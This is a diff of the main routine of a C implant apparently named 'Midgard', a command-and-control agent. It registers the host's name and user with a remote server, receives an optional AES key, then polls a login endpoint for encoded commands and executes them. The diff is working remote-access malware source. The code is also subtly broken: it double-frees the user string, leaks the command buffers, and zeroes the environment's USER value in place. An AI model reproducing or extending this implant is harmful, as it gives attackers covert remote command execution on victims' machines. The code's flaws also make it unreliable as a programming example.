@@ -90,14 +90,26 @@ int main() {
 
     // Create UUID
     srand(time(NULL));
-    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
+    const char charset[] = "abcdef1234567890";
+    const char y[] = "89ab";
     int charset_len = strlen(charset);
+    int y_len = strlen(y);
 
-    int uuid_len = 16 + 1;
+    int uuid_len = 36 + 1;
     char tmp_uuid[uuid_len + 1];
     for (int i = 0; i < uuid_len; i++) {
-        int uuid_index = rand() % charset_len;
-        tmp_uuid[i] = charset[uuid_index];
+        if (i == 8 || i == 13 || i == 18 || i == 23) {
+            tmp_uuid[i] = '-';
+        } else if (i == 14) {
+            tmp_uuid[i] = '4';
+        } else if (i == 19) {
+            int uuid_index = rand() % y_len;
+            tmp_uuid[i] = y[uuid_index];
+        } else {
+            int uuid_index = rand() % charset_len;
+            tmp_uuid[i] = charset[uuid_index];
+        }
+        
     }
     tmp_uuid[uuid_len] = '\0';
     char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));
@@ -110,8 +122,8 @@ int main() {
         return 1;
     }
 
-    char *hostname = read_file(&ring, "/proc/sys/kernel/hostname"); // Get system hostname
-    sanitize_cmd(hostname);
+    char *host = read_file(&ring, "/proc/sys/kernel/hostname"); // Get system hostname
+    sanitize_cmd(host);
     io_uring_queue_exit(&ring);
     char *tmp_user = getenv("USER");
 
@@ -120,41 +132,112 @@ int main() {
     }
     char *user = base64_encode((const unsigned char *)tmp_user, strlen(tmp_user));
 
+    // Profile Config
+    profile_t *profile = malloc(sizeof(profile_t));
+    profile->hostname = host;
+    profile->user = user;
+    profile->uuid = uuid;
+    profile->path = "/v3/api/register";  // Register endpoint
+    profile->agent = "Midgard";
+    profile->compile_id = strdup("bf86d08b-e2f4-4bc1-878e-2c71635efaea");
+    profile->reg = (int *)1;
+    profile->aes = (int *)0;
 
-    profile_t profile;
-    profile.hostname = hostname;
-    profile.user = user;
-    profile.uuid = uuid;
-    profile.path = "login";
-    profile.agent = "Midgard";
+    // First run (no processing)
+    request_t *req = calloc(1, sizeof(request_t));
+    profile->method = "POST";
+    char *http_body = send2serv(req, profile, profile->compile_id, strlen(profile->compile_id));
+    cJSON *response_json = cJSON_Parse(http_body);
+    const cJSON *key = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
+    const cJSON *iv = cJSON_GetObjectItemCaseSensitive(response_json, "param");
+    if (profile->aes == (int *)1) {
+        size_t outlen;
+        profile->key = (char *)base64_decode(key->valuestring, strlen(key->valuestring), &outlen, 1);
+        profile->iv = (char *)base64_decode(iv->valuestring, strlen(iv->valuestring), &outlen, 1);
+    }
+    cJSON_Delete(response_json);
+    cleanup_connection(req);
 
+    // Prepare profile config for callbacks
+    
+    profile->path = "/v3/api/login";
+    profile->reg = 0;
+
+    // Clean up variables
+    explicit_bzero(tmp_user, strlen(tmp_user));
+    explicit_bzero(user, strlen(user));
+    explicit_bzero(profile->compile_id, strlen(profile->compile_id));
+    free(profile->compile_id);
+    profile->compile_id = NULL;
+    explicit_bzero(tmp_uuid, sizeof(tmp_uuid));
+
+    free(profile->user);
+
+    sleep(sleep_int);
+
+    char *cmd;
+    char *args;
     while (true) {
         request_t *req = calloc(1, sizeof(request_t));
 
-        profile.method = "GET";
-        char *http_body = send2serv(req, &profile, "", 0);
+        profile->method = "GET";
+        char *http_body = send2serv(req, profile, "", 0);
         cJSON *response_json = cJSON_Parse(http_body);
         const cJSON *command = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
-        const cJSON *args = cJSON_GetObjectItemCaseSensitive(response_json, "param");
+        const cJSON *param = cJSON_GetObjectItemCaseSensitive(response_json, "param");
 
-        if ((response_json == NULL) || (strcmp(command->valuestring, "") == 0)) {
+        if (response_json == NULL) {
             cJSON_Delete(response_json);
             cleanup_connection(req);
             sleep(sleep_int);
             continue;
-        } else if (strcmp(command->valuestring, "exit") == 0) {
-            cJSON_Delete(response_json);
-            cleanup_connection(req);            
-            free(hostname);
-            break;
+        }
+
+        if (profile->aes == 0) {
+            size_t size;
+            cmd = (char *)base64_decode(command->valuestring, strlen(command->valuestring), &size, 1);
+            args = (char *)base64_decode(param->valuestring, strlen(param->valuestring), &size, 1);
         } else {
-            command_execute(req, req->client_socket, &profile, command->valuestring, args->valuestring);
+            cmd = (char *)aes_decrypt(command->valuestring, profile);
+            args = (char *)aes_decrypt(param->valuestring, profile);
+        }
+        
+        if (cmd == NULL || args == NULL) {
+            profile->method = "POST";
+            char *message = "Error: Failed to decrypt command or args from server.\n";
+            send2serv(req, profile, message, strlen(message));
+            sleep(sleep_int);
+            continue;
+        }
+
+        if (strcmp(cmd, "") == 0) {
             cJSON_Delete(response_json);
             cleanup_connection(req);
             sleep(sleep_int);
+            continue;
+        } else if (strcmp(cmd, "exit") == 0) {
+            cJSON_Delete(response_json);
+            cleanup_connection(req);
+            cmd = NULL; // prevent double free
+            args = NULL;
+            free(cmd);
+            free(args);          
+            break;
+        } else {
+            command_execute(req, req->client_socket, profile, cmd, args);
+            cJSON_Delete(response_json);
+            cleanup_connection(req);
+            free(cmd);
+            free(args);
+            sleep(sleep_int);
         }
     }
-    free(profile.user);
-    free(profile.uuid);
+    
+    free(user);
+    free(uuid);
+    free(profile->key);
+    free(profile->iv);
+    free(host);
+    free(profile);
     _exit(0);
 }
